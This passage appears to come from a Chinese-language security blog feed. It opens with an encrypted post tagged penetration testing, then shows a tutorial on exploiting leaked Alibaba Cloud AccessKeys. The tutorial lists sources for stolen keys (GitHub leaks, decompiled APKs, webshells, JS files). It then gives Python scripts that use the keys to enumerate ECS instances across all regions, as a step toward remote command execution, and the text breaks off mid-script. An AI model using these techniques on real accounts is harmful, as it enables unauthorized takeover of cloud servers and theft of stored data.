f7a933d364a84bcaff9873efb59ae046a4645955b2dd6c3dfb9f2d277749b0efdd759491af92109774a3a819918733a834b3fb35237799ae5ab34d07a4727d09b88826320ae50b11ec3dabeaa48c57a75c188a0e316d8282fd07b3ee02592198f8610977a9b81c86b91a0acc0e5ee83d6ced4db299a9587b9b5f5688a658ee425cf7dd5eb8c65bc25d9e0191936ad972685b71b6d8c8e5cef862321864eba8e1f8aa359aa742847b3e6c2366b3a1ea1bd0e22ebb918e469eb0c5c299d1393ca480abcca4e36696a65375dbd6ef9f5dd672d5ea8015643170ef674e2a6d6810bc6fa2296b53a4fe4579e2073b7751b3e6631c1d61450e09605d57774ce6fc5f3dbe7c846a7324132fd2b9461475167df4dc3a807893098b555d4194ce2b3109896cb20331f4e70aa25446e51fb66b4c5d18447dace7d7f93965685cda167ac36ed65c59b7a3ae73721ca8beecf28028088a8a4f53b2d49bab4311a8a11356bafc03b9ca3b604f1f39ea914e52e97e3380f1f240014711d983b85f27fa08939e7ef360302f24e58e57463802c49d83a44efd3e1a9623a655aef6393e3d10cb9c8fec231e8ea74666897bbc1cd3d855584bf7e64ad6fbcdaafbf5848b9d019cf2208d9de99e7d7e49972d1323e930f3071a64f97e44858459a85bbaf34ee346600dab7793cba5a5bee02871fae78f135f1734fa69c607c4b0cea9efaa815a6b3657ff5302363d618063e0e7629fe634ae0be155e3dc0b34e3d93c2835f2300d017501667f1421c0f54a2426490e3a8c21aa9dca7082a669e976d44430e839eab272e486a63a040706338a9eb39600138e96afd4a761921256becfe72fe4c496d7a6d6ba2c48dca18126a122d48c652c59d4d16641442fdd7bd2d9818320882211b6b7cbbec4e89d28d5fb9d3f1f4444dc838ad6cb9caf76d92951ac9c14fd830f7497a5119752fc5072a365ec2c09bf061836acad7d136bd700fd02d23b4832aca34972a2b891fc87ae768b91a8321e33f61ccbfc1e4ca92943dfc1a2976dcaca3c98d5dcdf0d60961c1fb625ded0874c6fc5fde6f0ebcdd7f5a74638febe9bc7d83814df938ebf0cd7b55cdcd7e3ed4c77bb17b0902389329ddae696861bfdb7c16153f1edffc01098dc7f90e493b6555308f5a88ce250f6883c990931866b943b1d06d1efe9e41df60512196fdeef8b0b982c3186aa068bd68e81b74cc1151b27ed73f1bcb53cbc98ca9ef6b46a0e50c2c904265be493c3970b58899605518c1327e287a529514df288f57886666f334946ddd8e240d398746e965e56a36ed2981a678dbd9f9472681089ae62a901e08e6498c797ce7a213f11aeaf11fddbcb0a538526b5417b47da253ecc6ce54bf3be3a3616199a3abc847ef1c59fe5450a4fc64161b3ed01b34c815210e52fe2e77aeaa8e9794c3c89c3de513643569d771ffed4224f3c210eb7257e9dd67475d1dd6637f6e0e071383a19b59fa59cddd42559f81a741162e48cc69c66d2d17d92bc5657b56683ef756952a9104fdd8d920426dba8ba69f4188f9d1776e0f2b60ca110c24818b6fbd1acff20568ade979e16ed261e2f8981539217b552358f24e2b938e2d7313b7a50ff0830429533617f47cf026dd36dd3e319271ff5d82642746303536ca638971d6daba14cd6cc4406ffd1d4c6add771dbeabe217f423381e8d6704021d58d0301c5f49e5d324322210e2d3ff4125dac43b6e1e286d6be7eec5f350ae9dfe2ad906053dc344cf4b2ae282f0ffc2c69ce205f2f7d597728cee840ab0d40b029d8ffda86d69461f270f44fbd7f690761dfd842d2d67d814bb4edcd07cf5223589a0333b54e01aaf6caf62032b47de2960223068abc15ed70d8e04694e81a366f58d57db4014efe6d7afd7f0152045a02ab3399bf67ceedbf3943052749e8986b06f840009a1d8c2a9c24383d5705e9b26a845e8aef7eef45a623cfa27523c2eec1083e8abba7115551f6b08253c2f305e4cfd6bb9b443880ccb1d731f2a6ee5f170847d852e5070e11c9fec0922f40d98233d20c359b0402c7ac5a8e379cca3cd40ae036462a517b81b5af8ba2cea11d6d1dfdc303e159272de075863bb662119fde54cdaa37e491ef18fb1d9ff7e7b36b99fdfc64d5a0fc6fc9b3da8d06c256f058c36f0fd4e0a0c8ff383ce855731725ff6b6a63d89ec0aaffb18447836d6a0a133c20122188a6a2d1cd08ae800aa4087f28702a38521b1e6759f6575795908416ff0164876f1602d39726399b5414cca6dd82d7ee09db18b50bfa636b548f3e2b3f12adea841ed5fc2aaffbd13e6c93e581bc7b98e67ca7099b910c28de78e0e3111238a766af6ae6ea95e5ee5cb0265c579d91175ea956d0174a0cacbdffaa3dab27557ac2e26f8283afa16c3802fe5aa8981063cef551d526ccdffcf265ec2b7c4c2881b4ce6cc883e8e36ab8f2c9cea5507c9b60893d0385ef5a319e060e7f402f1833bca7836dd12a7c98f824c71e6971fc0f3c606c29eaa11418ebfd52d757063c8d658d1c1e7eb1368fceea2eee3a2d76f6d0e27d1d0d8f1c072993da5ec74e1988623437039acf946f68341eb7ce12443198f2cfe49388b244e73798f409e992cdbe502a8277d46b4d705fa7f40eb05e5f0e1a88e9a5d904eeb3880230836fb522d6fd9be85b926c98e68d1f2b1ad340846f0c6c9349aad0bf7d1f7206583a8ba8bc3cbc3c2a4fcd9c5e0b731803f464be3a8bfdd7ad6a0d71110bc1e6a7748429ab645748accead4ac49753fa5846546df194b1a137c157d5ba136b1f454bb71746e10c0817469be76f3c39ab132731f83c0a720bfc95cf5e8aa08796c181a0db220eba28dfed3d169868359125e6fc8e2917d1eff1dc95f16545a05379262b12d839c6f03339b38fdc973250610330f6977475488510b9101bc9878040b34659a31f3cabca53fad94701e0a15dff230762d5fe2b0065f01572b70d18ac0903b03aa69bb141e3ef568a0cd961947d888e8603ab3977064d38f4183fb9af0579f3bf49e3a66e1cdd173ea4a061d4e541164d023f8cdb6ad99e086c58ad12ef7c0ef3ec5698f76ec1b0b1f40371fecd35db1057db7539f34b414fe4f03435cc5a8f86127ddb8fe7d46cb907a156917cf624ec048154f7c7c7be7a3143a7b5e8bab15236a02c27cc0049588c1e7785cd04f9a59f3999b8e38c2e80de2f98e88f6ce010b8fc76592f19312f5cf2f9946ef42680ddd8861d89dd01401a4ef00a9baa1cd4d905451df369f6753a538f1b1d9e1bae52b5d3288cf6eea30b3205715b2ec795dfb6816f504f757e0c58b6e473d5908d564b8cd9329d8fdfdd9da4722438df8a64a930996d038d786033c7aeb470120afe5defc5d6675e569f064a6d8c4e412e71c5a69e27ae5f819babfe24302da61ecbdf78b15bb6be06b1fb17e302c6bd06ce7dbe38fbfe59991c2cd9354fd3c59a2a9e34ee75627e8770567c987156256ad693028fd8986ee9bd438c3860e8136b6015e3961deec4d9ddb2565a5f7c7cddde508fa9550c3caf04e420b7e0c58d063354634a873b4daa533e3f6bf849a8abdbe22f7a13530fd371ab3ee5fa81d23a5ef39453d8c8d1b78c4e30273c2ad8d0f16eda0664d84300fdf4a2fe508b91b55d60027f45915ff884856e2e862af5c8779597ba4560431f7d4e07d7ae316d4651e2a77ecdde22550c39ed97194b34010997f2bacf102dc6e19371db230f27312ca9d1f1fe9df4115ac1e35d316e6fed5f80db7cffb83a6b196fdea4d0db4541e0ff781d17cf356ea3d56e4c221979b7f79eb90aa24f20a3c5ff9af2973c4758b2d360a33ffd4585789ef3b1eb46301aa3b221e30dc0d8a3a7baec23e94fe59d72d0d3df29a26ee227fb27a74ee74860ae78a7ee4b6496f83451ece6b0051fd5dc3982b67a425e35ea966044399b0b41506678a4fcf9f41cd8d6c44fbfdcaddf5d5b219b78b72188538155437ca1fc8cdb90d80f13f5af786ade5be0b6df4f25429da0f9547e82a19a33eb2951ebdcb8a5e1835141759424de1568d6bf751af047bb8d340c46bf5f3c4fc1fe13da33b4f23fac26fbc17eb2e70a60b86b9df1b1fb2f676162c4759ba304f77b0b734ab1ad1322136e106a92e14d22060d4cddf95eea11ddcc4a49fdf32dccb00c641e98cff721488aa8ded514e014af31a4247b246d2f8d417a2cdafd721d9d588eb99c23d42809cce3445135672894cdf1340363272f4c928a61d733723f6ce18b4d633f921735c5d159cdf9d954454f801c555fca6be1d4bc8340b28719fad8c0634c12c60c38a5cc28765b71ec95f86064fac19ffa7122d276dc8eaaefb6a4f3dabc810c5d7ac50525de83135e68e77da66c629c2f14a401bd26e2b03a30a806a29f031512ed90dc3d013767c277cb6848e5c98d3d9c3e48d13615d2cee81cc1cf2dd78f49d411dcdb59883d540616ff0ae72edf85581ce89c9ac6c71be218c4a0199cc354d861e647f5e503bf8a5523ac19aca621c118976dc61c842400b978c364edf7be6069e2f98bd1613a26d68ad883185a4d257f2f1285b13ee28339f9a25927b79cc1bdc918910cf63b992a98115283756c40f1de30636db9c4f643a80a5606e1cd3d1981659befde71cbd101416e60310b062d33e91fb3111b638e50db79f0e63cb297cf332bf173d456d238ad00e69c2af2ba22e76b5f202eed336061e949e02b5b078bf0feb06e3e39460fdfed25bec73fbc0b315eb9d98fdd6539e2d0e76ec0da09548bc517b1b47866bee9e0971544329bbdbf81b56dfe3280a4594e8ac29bcb0ffb807c1959a9de53586125d62268eed5071d4ee07696cfa9f43bb889efb28a9e8d03107f83477cfda407dcce83f46bb0c69356c729210f197f0c63c1aa5dd4a04350f9a3149bd3e7c3c52b0ab773285786390d896bd42804e276a83c67c3485c1f933281ef8f4eab19f2e01fa3e0a748442928cac9701048841613c2315e5aeac66411219e563044e71580c157608d8212903de13e4738166dee78d3574caa76fc3aea4fd60b375734d3efc2126a555e159fff7099ea322c6768d982b5d2e6dcc438dfe8c9b42d2ee28fc8b8b491182a03678148c6456d2270a158cf66cec9328d7e67c2e3d78456bf42f6974c410a8f8a9714871bb2b13d8386b72bf0cc0451e828b1125cffb6f1a9a6c640d5c6684625f69eb69f0e433acfb7e9b38870c0f8a7223ba74d116efbcc32dd26a8fb598fdc498ac5f06cdd25cb8270b899451cb6f4ae0af44ccfaa25e49d58367682c1fe7d0b49ab59750ff299c7a5c26f499cec8bf80dc276319ca93f8940f5e12a538d9b620e0d95d3e706178795f29073689032960af6aea9fba13ae570f24db06ad8280ad0c3a4b26f7a464e943e69e9a1ecacb0e7d199e971ba12054bcae19d4ea152b1c0696866782d765957f4930d2fe7240e815eb10bae9a060eefda288f758492debc335b05faff4f6695be5762dd15f41f18c84422bd938959894e754cb0fc9390783d16b1d5c041014beccc9c9f30b1ad3ae5c07cee757b42018704e3c601bde07ebd9632ec4e9b67ccb547e4586eb6395eb827749dec066ca656d2991e823517927669a47229ae24715b2808d328d39ee72424b53b5b0bdf4eeb7a90b8b4cc3bbbde6de6ea5ff0a89bc3e8099cd2d6a4d2169705f7d4b7f81e9663692be8b62ae7e63b753e5ed4edbfb4a1cb039d26b67ced30ea86784859cae253b6b22146c9ce0411800d156300cde3d39f4d61134a61740378e841de3a3ed731621e6a4c8e33fcf0ce3fecbda256097a7deca784f6c8f1b6aaee5fffc520f55a0aba8ffd92d5383e779dd2a569c21babf21b35f6226438e8ccc9e93a847cbfd36aa4fae2ff5e3861ed15babc57f2c9105480953c2c1b8626db738a9b1ae5877e76e55595415d778dd4e5520dfeae8b3c054f06c8a8077914d36f2e73cfdde14a2d76f89d874fe6320f0b160d5ad7e6bdac60d3191607c6ade3f0c701ecac7a464efd3ef7b421a262b38413c1a4531bd093b8b8c7cb0077c78e7a3594b97851b2ca35041569a55d2c6adee70a95ecfdb1c8ee8a9a066d3b1c979e3e209871baa12fe5a8176341d5aff1ca13601e29db3df4ed2bdbe3324e5deec00d1b7c4de8ea88183aaaaa487dda738790bfadcc7419a667031a00a2448607ea88e6be9ad1863670cb1b5e68242a9bbb06b08ff1af7f746259c25a0da5ab502ee863d185690800f636a8b6207383c8bf18f7c9067d5204f21bbe3799b6ee6dd05e213ec16ee3911acb1ffdceca844cbdc831406fe042232e1519424e6903f07f7c9ea7419cbc5dcd3e4f5e39ba7e91ab48ec6a0f9121a39e965de918dd3d48d3093d8bc0b163a093b053630a38f70fcacb6e605534b7ae7950b23c470c1eaf8f54282243dc39bd1671f75a373804b736b2b78dcfbc32b5d8c1faa95a45daca90d7e6c0527aa57a17e60a1cd92516c32e72bd59299528a0dfb26bbaa35df9e896b400a056db9842b667dde8180f16d0db48e998f2ba2920f92ca8806d4198526a5518750657d2cd9f30d3da5aad37d52ad0081a407606ef9ce779030c0a999912f1e4a581c6c2677c352d3c164662d287e9d2885e872b30a2dc0dd51f1156d2324d4def11a0c1aad2c52cef3ed62ac64ffd6b24c84ab18afbfb6de4de544150d869a786cad28c45583371b83ceb04f5d62c3ff2130db2c20df61608063faa80f8e0100aa8856b7d827f51ab93370368a3dcc64daa87a8c0746c6f854d02c78917e6a2a8861be064d17a0b1e0140a83beb34475ca04a4e81d837a9abde9895bed70688d249b22ae1b0570a422c6b4acce97be23996a1d3928599c85ba6516ea7dd315236b43c6e3c48d4bd98a114e762138c38c64cb736d843ac2c0f46388f41c43bd670f1be18576d90715b0c92bc39fc670a2b7a872b589108db4b8c4828219c42529a601e1e08896e59f995e3ddd613ac1aaf6cc5b4ef7b4333e53851ca10c692a7deab5592d54508343bd4583be7b5d1fcce11a5dcfbd987f84d5d8dc4128255a8ca2d1341df40e6af7b2f81d4a97d8b9d800dea4c3f3df0442a67798761e2bd1f9fa03671f2914d4f9be8fa746ddaf068ab73a0ac0c144f7eef2652bb2f6033f141328c1c9c921572f77c653db499d986276d4e41672c81176d1f72eb9be8dee9f3fe5367b536ee69347bd91b3434e104e07841f7ec9d8e618d922c14845abfda95d347206588f8faaa204196f15a3fbc093d7857a96f194e7169f91f461b49b2d6b86fca3e88ed121ec586447f39d4c4e1b4008dd61727766252947fb0c650e4305f25fafea9e3513feb8715f8d11673dd135dda91c16dc5dcc2807d02f5992984e61da8bd5248e706e5ea610aa084445ec39b76a6927d140729d7ab3ae264f6e73488a66bf807ebb306886eeac44d79e6663ce6c30ae4891f53915fe244c547a01b6d95c93311e71570431af0cc3aecde1d6a56ed82599f8416d174ce83928d15b60a7a1ab5573ad125cdad7c1e950e6a450d5ca18be54a1ce085018cada1e1ea39ce46e968277a11a1f398486a06365992350eb7b22c6482a2ea417d1d327274780dd40a06baa826b58c240bb7dc12390668b34bc3e798fd4ef72b000327edb82aba449983675346f22a398222705f622d186bb026a566b0c445b38baff65e2ef480ef1de5567293a682dc76af78c732cbb8634330bd27de40499dbf7e0c977bce6b95a534a6b0536535faa1d578972c0b307626e4a4692e51aac87a7f99daeece236cf96c4b802c91b7f584dcd86ef322d5bf29e2a771b4b78e1a955f925655f2f30fc77801ffebaae18f7bc1d8d46906b8a59f25ee155fda9e2345049d5018f1b430a6d72b1e01ca711fa13cdce135f058d9d64f57218e7f60db615d5535b3af2d1ca84baa70e929da637683c268e9443855afa954351e5eb0f5d620b9731af3486d24b6aded20cf6559145a84fe9520ce4f46efcdbc2856e52da2e795c56db69b172d5b1afe5b698b26d5082c70359d8f10601c890ef7936ea75cd0152c2d85e45d7f94e2fc4b2304d2a412bd78a4b7c995c3aaf935d3e2f2033f4d333be040d8bfc38f8e5f52854669a4d8a646abb9412f8607aead33987c052e3aabe56175fcf0a530f0a7ffd9cba9016542ab86b9f4d65e52cf8c4bd36fa14a3dbb3aeafde911e16ebe0f67cdd920b0cf4698ec2f501b0cdf4d2dccb0f203a8d7ab61a3edcb5ac951ead99047d00515c1bfe6433b39404553ec45128dcce941c7ee56ea915d51c2deab27966496bdf2f5ab045f44d8469d89a87c9253a1a438847f393b4b10839003059c9afb75ad190b41914da6f556ce230efaeb1239b5c150d2f1882809dfe0e5ce1e9684c74045c250e5a21ea7088ef503915016b50fd8a272ba9dc52b3e36c6d7660a1fd8fc844a6ab7185dc50563c8f3c52f223357cecf6d71211b656b2b3d5529114d80b8454a91244de5afa7497495733f74e2e671a5c46fa5f2f3d56c4a3de6a5ba3ba0d2f5f7a89e3e72b49670ba19878038a6771652e9ce0a66a1193a3ac7e774368d1befa8a4f2086e13c162749c741dc71252f6f6070410f1b5b6f9cae242893f8f2b70ba7b0f5d44438dd11c02fa479154cbad78886fd077f69b73e32b586bad0bb69db473649f42ac570a45f579ab26df2e347122186bac054833c383ff11e9431ed71a7a1ef060e56719d77bf2fdb2efbc0104a94a455a6d41664e65e2aecc585dd036fcd7120266133c183b4340ca458e2c05f363f5ff97fe514dd5ca6e3c8d74e758b449d8f349908657d13786a40f169e0fdbedf8d060d794131cc3537255b5e081117ce63bfa623e71f1f95fc9ff9f13d255f940c8b8423591744bab45dd4ad83b0dc1fdc75574b01c32bb533d650d480b7ce73b919615d866040fd715259ff37a8b8c13d88c4c35a673bd7a189d5544a27f7c53bc546100111fe259d4d749473a8c1bd4fa9d526f30052aa9f673d52b3f318fa31185ecfa94516d11f9a2ad1e6be43f6d0decc96daa8b11852da101b1820fea4fdb5f1bd7eef51f2da1973da1b0ef70e9aea877030f03c1a19e220fe0c8f41a7c54e6e5c17cbc7fb1d8061ec7f3cd19f9ee415bb79ccfe8372178b52e0eb179f67c87c30c7daa2f8270e9189040b53b4686c85a462d97f9cab0a54e5b6c66a883c1167a4fedce657e880e9cd0d1230da725b51f50293be5381de6eb97b8947682f4c5f564f51bc5b208a9d48950883201ac7e17f366859ce66eecb6c09e1cccd2203ed04798a37e5288b8f4e7c36f7bca501a247deaff6392d3b1cd73585539b485ebbea1a63f8a14649736d4d6a56fd9c368e5d78e72f0c392579ba94d5ca91659fd7015636919bd575b4affec31979e7a734bdb2c47c21e2c1511e59e06e3da670c288bbcf47f293376283522dc2ab951deada5ea7b6e0a2480bf48be122a4a1ebb13a52e9e09b56b596db3304de6a7ccf44b5c961d224ad288ca4e0bc4f4bc94fcd9577f70c132dd42faea65ee4634c9504ac79bc63f2d5f6c49d6819c327ea643736fb7ca330e533b51da1f16b1692e094d523edcb5c94c99d0f1bc60717820afdf92d3a75323e65c662765dba85e79cce24d8559c5716bb5325d3f32a5d29462e151519352aeedc537ac125778838ccb533d554bbb993d7c123d5c73373fd069e3126144bfee69d147974ddc0e8152c71fd4ba063940d9bd5f3f7e154fb6732fcf4b19456dac0a67c4208b2351530fbb4fcb53f11d9d9a250190fa1c2bc4e51153635a9e830ae5b57ecf5b4144a5f953965e888ffd6fa851f27050515aaf9c5760d8140b6889a3951b196394cd7d5120d1787810fc64f471a655fc1cb654a3532efea92015549156b6e6af640a6c599c2b9ba26c4a226e946742dc56fcd4ef0c28cbdc7f35de2efec74ff0f64dd7492d88e9d661af41636e48418953de38eac8935e5c041d19edc0f6d058c0aa99fe6fb0f16d04c5dd1bb817c0809236215b929009246b486a6912981cb1938925ede313b5680cfff6fd0a67ac27641b1f9e6de270a5051e46b2cf37aa6a9bbea04406a0fa6df2dc2fa15f4ac69ab5e9378e7d3e11b9cd1a221687bede7f5b33f617054e1e5e5acd3d1b8e198db818223e4189f59421223dfbba1e7efa79d1ca64fdb1d3a9ab99069425019ae5668a645d1b5122c81ea5c58be1b79999ee02902f2a3ca7e2bce7f513960f12bea932644372736436f1b9685f236bdf6f01427209e2f6c4fef7c396ffd2166ea2dd07432671fadab5ef2fd30c37ce9bfc81cd2f942bc945423ae0fe628392f1c5d46e9946d705f5d8299ad050ac79f175eedb75324501d9830bdb038caefda89a0c14c234461cebe3d19cb341c7c126e268a1a781e5f2125e77a54a09176ad8a6ddc2d627d50846adc090b03d83c0898bd23e97673b3f2989aebe2e9329d2c1350f0a41c4a21ec6591fc60dec611accec1a1e1d1025b59f201bc854cdbc46ac89c8bb79c3d68618de08c904aad7427a394382d2b4c76c65e30bf440bd31f73c62e27a60b5acc88947028f9e16967d40c2d6e11eee04fbf1403315cb8bb95a7ff5512ce8481e9053c4121c8ee0896f31c6229fa0aa4cb8840ff51a3b45ee596cff566bb0a01bb57b5c8b0dfb6d564fb6748e5a0dc5579fa0448a8a12023757dbc3d293664d67fe8e963281023c16dcd7cc148706e750ad6c2763efb420d91a7210b136dd96241bf1e1f8771574dc134b878799db7d29ec94d9367341cedcb3ff9a7860b127ca0de8b0f65b7d488667a384d14c5386127074774accb3ad97213e90d390c8a93fca03e984ca5adbcf4f54119cb5dda3ca6ae007ad9e4e96ccba54d20ea485f00efdf48fe017f12e8a4061e37920da5e8b6f09cdc78983f5b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>阿里云AccessKey泄露的利用</title>
    <link href="http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2020-08-31T16:00:00.000Z</published>
    <updated>2020-09-02T04:08:05.151Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露，apk反编译泄露key，比较低权限的webshell，js文件，fofa查找。</p><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a><strong>工具利用</strong></h4><p>利用<a href="https://github.com/aliyun/oss-browser/blob/master/all-releases.md?spm=a2c63.p38356.879954.6.745223c9XFlufA&file=all-releases.md" target="_blank" rel="noopener">OSS Browser</a> 获取oss上面的数据</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/1.png" loading="lazy"></div><p>利用<a href="https://yun.cloudbility.com/" target="_blank" rel="noopener">行云管家</a>获取云主机列表，行云管家可以重置ECS的密码（千万别这样做）</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/2.png" loading="lazy"></div><h4 id="OpenAPI-Explorer"><a href="#OpenAPI-Explorer" class="headerlink" title="OpenAPI Explorer"></a><strong>OpenAPI Explorer</strong></h4><p>python导入模块(python2的环境)</p><pre><code>pip install oss2pip install aliyun-python-sdk-ecs </code></pre><ol><li>利用DescribeInstances获取某个区域的云主机列表（DescribeInstances.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/3.png" alt="" loading="lazy"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-shanghai'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>脚本会输出该区域的公网内网IP，主机名称，InstanceId等等。批量获取所以区域的主机信息(主机名称，操作系统，内网IP，公网IP，区域，InstanceId)，InstanceId在后面的命令执行需要。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> json<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestRegionIdes <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'华东1（杭州）'</span><span class="token punctuation">:</span><span class="token string">'cn-hangzhou'</span><span class="token punctuation">,</span>    <span class="token string">'华东2（上海）'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai'</span><span class="token punctuation">,</span>    <span class="token string">'华东 2 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华北1（青岛）'</span><span class="token punctuation">:</span><span class="token string">'cn-qingdao'</span><span class="token punctuation">,</span>    <span class="token string">'华北2（北京）'</span><span class="token punctuation">:</span><span class="token string">'cn-beijing'</span><span class="token punctuation">,</span>    <span class="token string">'华北3（张家口）'</span><span class="token punctuation">:</span><span class="token string">'cn-zhangjiakou'</span><span class="token punctuation">,</span>    <span class="token string">'华北5（呼和浩特）'</span><span class="token punctuation">:</span><span class="token string">'cn-huhehaote'</span><span class="token punctuation">,</span>    <span class="token string">'华北6（乌兰察布 ）'</span><span class="token punctuation">:</span><span class="token string">'cn-wulanchabu'</span><span class="token punctuation">,</span>    <span class="token string">'华北 2 阿里政务云1'</span><span class="token punctuation">:</span><span class="token string">'cn-north-2-gov-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南1（深圳）'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen'</span><span class="token punctuation">,</span>    <span class="token string">'华南 1 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南2（河源）'</span><span class="token punctuation">:</span><span class="token string">'cn-heyuan'</span><span class="token punctuation">,</span>    <span class="token string">'西南1（成都）'</span><span class="token punctuation">:</span><span class="token string">'cn-chengdu'</span><span class="token punctuation">,</span>    <span class="token string">'中国（香港）'</span><span class="token punctuation">:</span><span class="token string">'cn-hongkong'</span><span class="token punctuation">,</span>    <span class="token string">'新加坡'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'澳大利亚（悉尼）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-2'</span><span class="token punctuation">,</span>    <span class="token string">'马来西亚（吉隆坡）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-3'</span><span class="token punctuation">,</span>    <span class="token string">'印度尼西亚（雅加达）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-5'</span><span class="token punctuation">,</span>    <span class="token string">'日本（东京）'</span><span class="token punctuation">:</span><span class="token string">'ap-northeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'印度（孟买）'</span><span class="token punctuation">:</span><span class="token string">'ap-south-1'</span><span class="token punctuation">,</span>    <span class="token string">'德国（法兰克福）'</span><span class="token punctuation">:</span><span class="token string">'eu-central-1'</span><span class="token punctuation">,</span>    <span class="token string">'英国（伦敦）'</span><span class="token punctuation">:</span><span class="token string">'eu-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（硅谷）'</span><span class="token punctuation">:</span><span class="token string">'us-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（弗吉尼亚）'</span><span class="token punctuation">:</span><span class="token string">'us-east-1'</span><span class="token punctuation">,</span>    <span class="token string">'阿联酋（迪拜）'</span><span class="token punctuation">:</span><span class="token string">'me-east-1'</span><span class="token punctuation">}</span><span class="token keyword">for</span> RegionId <span class="token keyword">in</span> RegionIdes<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 填入AccessKey ID 和 AccessKey Secret </span>    client <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxxx'</span><span class="token punctuation">,</span> RegionIdes<span class="token punctuation">[</span>RegionId<span class="token punctuation">]</span><span class="token punctuation">)</span>    request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>    request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    response <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> Instance <span class="token keyword">in</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Instance<span 